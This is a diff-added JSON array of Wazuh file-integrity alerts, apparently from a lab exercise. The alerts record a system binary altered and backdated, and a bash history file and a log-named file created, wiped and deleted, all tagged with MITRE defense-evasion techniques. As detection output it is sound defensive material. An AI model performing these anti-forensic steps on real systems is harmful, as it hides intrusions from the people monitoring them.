+    "timestamp": "2026-11-02T22:53:25.827+0000",
+    "rule": {
+      "level": 7,
+      "description": "Integrity checksum changed.",
+      "id": "550",
+      "mitre": {
+        "id": [
+          "T1565.001"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Stored Data Manipulation"
+        ]
+      },
+      "firedtimes": 6,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_modified",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "002",
+      "name": "web",
+      "ip": "10.20.32.80"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660005.19975613",
+    "full_log": "File '/usr/bin/yes' modified\nMode: realtime\nChanged attributes: size,mtime,md5,sha1,sha256\nSize changed from '31119' to '31112'\nOld modification time was: '1793660000', now it is '1787670771'\nOld md5sum was: '656f5564e9416f578fdc3edb065832c3'\nNew md5sum is : '57e9fa209551af0c38216d64373d14d9'\nOld sha1sum was: '7cfa99fe2f0fe0ffa827da47fbd99fd7b580771d'\nNew sha1sum is : 'b91eaf624a8cbdf17571a40897f9fab202933cba'\nOld sha256sum was: 'a6505c8ce87a35aa66ced72b526acc8df8c358d52ad11d7d5ea9947fafd0c462'\nNew sha256sum is : 'a63b5b6bd13460b0914b8bb4f4b08a3f2587f4cbcf630d771e364344b06a40b8'\n",
+    "syscheck": {
+      "path": "/usr/bin/yes",
+      "mode": "realtime",
+      "size_before": "31119",
+      "size_after": "31112",
+      "perm_after": "rwxr-xr-x",
+      "uid_after": "0",
+      "gid_after": "0",
+      "md5_before": "656f5564e9416f578fdc3edb065832c3",
+      "md5_after": "57e9fa209551af0c38216d64373d14d9",
+      "sha1_before": "7cfa99fe2f0fe0ffa827da47fbd99fd7b580771d",
+      "sha1_after": "b91eaf624a8cbdf17571a40897f9fab202933cba",
+      "sha256_before": "a6505c8ce87a35aa66ced72b526acc8df8c358d52ad11d7d5ea9947fafd0c462",
+      "sha256_after": "a63b5b6bd13460b0914b8bb4f4b08a3f2587f4cbcf630d771e364344b06a40b8",
+      "uname_after": "root",
+      "gname_after": "root",
+      "mtime_before": "2026-11-02T22:53:20",
+      "mtime_after": "2026-08-25T15:12:51",
+      "inode_after": 12217390,
+      "changed_attributes": [
+        "size",
+        "mtime",
+        "md5",
+        "sha1",
+        "sha256"
+      ],
+      "event": "modified"
+    },
+    "decoder": {
+      "name": "syscheck_integrity_changed"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:26.824+0000",
+    "rule": {
+      "level": 5,
+      "description": "File added to the system.",
+      "id": "554",
+      "firedtimes": 5,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_added",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660006.20098094",
+    "full_log": "File '/home/ccc/book09-history/.bash_history' added\nMode: realtime\n",
+    "syscheck": {
+      "path": "/home/ccc/book09-history/.bash_history",
+      "mode": "realtime",
+      "size_after": "20",
+      "perm_after": "rw-rw-r--",
+      "uid_after": "1000",
+      "gid_after": "1000",
+      "md5_after": "60585ef0836eefd5c3f1b62d13f90f53",
+      "sha1_after": "4b66c81e2b8e85784070d66e53a6a22ff6e629a8",
+      "sha256_after": "27706300028a69d6d9f4511046a5a27d682e9d066b9bc37e675b4db05f2ddfd0",
+      "uname_after": "ccc",
+      "gname_after": "ccc",
+      "mtime_after": "2026-11-02T22:53:26",
+      "inode_after": 2621848,
+      "event": "added"
+    },
+    "decoder": {
+      "name": "syscheck_new_entry"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:26.866+0000",
+    "rule": {
+      "level": 5,
+      "description": "File added to the system.",
+      "id": "554",
+      "firedtimes": 6,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_added",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660006.20134498",
+    "full_log": "File '/var/log/book09-btmp' added\nMode: realtime\n",
+    "syscheck": {
+      "path": "/var/log/book09-btmp",
+      "mode": "realtime",
+      "event": "added"
+    },
+    "decoder": {
+      "name": "syscheck_new_entry"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:32.279+0000",
+    "rule": {
+      "level": 7,
+      "description": "Integrity checksum changed.",
+      "id": "550",
+      "mitre": {
+        "id": [
+          "T1565.001"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Stored Data Manipulation"
+        ]
+      },
+      "firedtimes": 7,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_modified",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660012.20376650",
+    "full_log": "File '/home/ccc/book09-history/.bash_history' modified\nMode: realtime\nChanged attributes: size,mtime,md5,sha1,sha256\nSize changed from '20' to '0'\nOld modification time was: '1793660006', now it is '1793660012'\nOld md5sum was: '60585ef0836eefd5c3f1b62d13f90f53'\nNew md5sum is : 'd41d8cd98f00b204e9800998ecf8427e'\nOld sha1sum was: '4b66c81e2b8e85784070d66e53a6a22ff6e629a8'\nNew sha1sum is : 'da39a3ee5e6b4b0d3255bfef95601890afd80709'\nOld sha256sum was: '27706300028a69d6d9f4511046a5a27d682e9d066b9bc37e675b4db05f2ddfd0'\nNew sha256sum is : 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'\n",
+    "syscheck": {
+      "path": "/home/ccc/book09-history/.bash_history",
+      "mode": "realtime",
+      "size_before": "20",
+      "size_after": "0",
+      "perm_after": "rw-rw-r--",
+      "uid_after": "1000",
+      "gid_after": "1000",
+      "md5_before": "60585ef0836eefd5c3f1b62d13f90f53",
+      "md5_after": "d41d8cd98f00b204e9800998ecf8427e",
+      "sha1_before": "4b66c81e2b8e85784070d66e53a6a22ff6e629a8",
+      "sha1_after": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+      "sha256_before": "27706300028a69d6d9f4511046a5a27d682e9d066b9bc37e675b4db05f2ddfd0",
+      "sha256_after": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "uname_after": "ccc",
+      "gname_after": "ccc",
+      "mtime_before": "2026-11-02T22:53:26",
+      "mtime_after": "2026-11-02T22:53:32",
+      "inode_after": 2621848,
+      "diff": "1d0\n< echo book09-history\n",
+      "changed_attributes": [
+        "size",
+        "mtime",
+        "md5",
+        "sha1",
+        "sha256"
+      ],
+      "event": "modified"
+    },
+    "decoder": {
+      "name": "syscheck_integrity_changed"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:32.284+0000",
+    "rule": {
+      "level": 7,
+      "description": "File deleted.",
+      "id": "553",
+      "mitre": {
+        "id": [
+          "T1070.004",
+          "T1485"
+        ],
+        "tactic": [
+          "Defense Evasion",
+          "Impact"
+        ],
+        "technique": [
+          "File Deletion",
+          "Data Destruction"
+        ]
+      },
+      "firedtimes": 4,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_deleted",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660012.20377943",
+    "full_log": "File '/var/log/book09-btmp' deleted\nMode: realtime\n",
+    "syscheck": {
+      "path": "/var/log/book09-btmp",
+      "mode": "realtime",
+      "event": "deleted"
+    },
+    "decoder": {
+      "name": "syscheck_deleted"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:53:36.700+0000",
+    "rule": {
+      "level": 7,
+      "description": "File deleted.",
+      "id": "553",
+      "mitre": {
+        "id": [
+          "T1070.004",
+          "T1485"
+        ],
+        "tactic": [
+          "Defense Evasion",
+          "Impact"
+        ],
+        "technique": [
+          "File Deletion",
+          "Data Destruction"
+        ]
+      },
+      "firedtimes": 5,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_deleted",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793660016.20470012",
+    "full_log": "File '/home/ccc/book09-history/.bash_history' deleted\nMode: realtime\n",
+    "syscheck": {
+      "path": "/home/ccc/book09-history/.bash_history",
+      "mode": "realtime",
+      "size_after": "0",
+      "perm_after": "rw-rw-r--",
+      "uid_after": "1000",
+      "gid_after": "1000",
+      "md5_after": "d41d8cd98f00b204e9800998ecf8427e",
+      "sha1_after": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+      "sha256_after": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "uname_after": "ccc",
+      "gname_after": "ccc",
+      "mtime_after": "2026-11-02T22:53:32",
+      "inode_after": 2621848,
+      "event": "deleted"
+    },
+    "decoder": {
+      "name": "syscheck_deleted"
+    },
+    "location": "syscheck"
+  }
+]
